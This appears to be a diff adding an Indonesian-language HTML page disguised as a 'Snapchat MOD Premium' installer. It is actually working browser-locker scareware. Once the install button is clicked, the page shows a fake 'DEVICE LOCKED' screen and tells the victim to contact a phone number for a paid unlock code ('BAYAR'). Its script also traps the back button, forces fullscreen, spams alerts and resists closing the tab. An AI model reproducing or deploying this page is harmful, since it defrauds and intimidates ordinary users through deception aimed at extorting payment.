@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat MOD Premium</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial;
+            text-align: center;
+            overflow: hidden;
+        }
+        .lock-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 99999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+        .lock-layer h1 {
+            font-size: 42px;
+            color: #ff3333;
+            text-shadow: 0 0 20px red;
+        }
+        .lock-layer input {
+            padding: 15px 30px;
+            font-size: 24px;
+            border: 2px solid #ff3333;
+            background: #111;
+            color: #fff;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .lock-layer button {
+            padding: 15px 50px;
+            font-size: 22px;
+            background: #ff3333;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        .lock-layer .info {
+            color: #aaa;
+            font-size: 16px;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Konten palsu Snapchat MOD -->
+    <div style="padding: 20px;">
+        <h1>📸 Snapchat MOD Premium</h1>
+        <p>Klik tombol di bawah untuk mengaktifkan fitur premium!</p>
+        <button onclick="activateLock()" style="padding: 20px 60px; font-size: 28px; background: #fffc00; color: #000; border: none; border-radius: 20px; cursor: pointer;">
+            🔓 INSTALL MOD
+        </button>
+    </div>
+
+    <!-- Layer Kunci Permanen (hidden awal) -->
+    <div id="lockScreen" class="lock-layer" style="display: none;">
+        <h1>🔒 DEVICE LOCKED</h1>
+        <p style="color: #ff4444; font-size: 20px;">HP Anda telah terkunci secara permanen!</p>
+        <p style="color: #fff;">Masukkan kode pembuka untuk unlock:</p>
+        <input type="text" id="unlockCode" placeholder="Kode..." autofocus>
+        <button onclick="checkCode()">UNLOCK</button>
+        <div class="info">Hubungi +6282117450684 untuk bantuan</div>
+    </div>
+
+    <script>
+        function activateLock() {
+            // Langsung tampilkan layar kunci
+            document.getElementById('lockScreen').style.display = 'flex';
+            // Matikan scrolling & interaksi
+            document.body.style.overflow = 'hidden';
+            // Fullscreen paksa (kalau diizinkan browser)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+            // Loop kecil biar gak bisa exit (pakai alert spam)
+            setInterval(() => {
+                // Coba fokusin layar kunci terus
+                document.getElementById('lockScreen').style.display = 'flex';
+            }, 500);
+        }
+
+        function checkCode() {
+            var code = document.getElementById('unlockCode').value;
+            if (code === 'BAYAR') {
+                alert('✅ Kode benar! HP akan unlock dalam 5 detik...');
+                // Redirect ke Google biar keluar dari halaman ini
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 5000);
+            } else {
+                alert('❌ KODE SALAH! HP tetap terkunci!');
+                // Reset input
+                document.getElementById('unlockCode').value = '';
+                // Spam alert biar makin kesel
+                for (var i = 0; i < 3; i++) {
+                    alert('⚠️ PERINGATAN: Jangan coba-coba! Kode hanya bisa dimasukkan 1x!');
+                }
+            }
+        }
+
+        // Cegah user keluar pake back button
+        window.addEventListener('popstate', function(e) {
+            history.pushState(null, null, location.href);
+        });
+        history.pushState(null, null, location.href);
+
+        // Cegah close tab (workaround: prompt spam)
+        window.onbeforeunload = function() {
+            return "⚠️ HP Anda masih terkunci! Jangan tutup tab!";
+        };
+    </script>
+</body>
+</html>
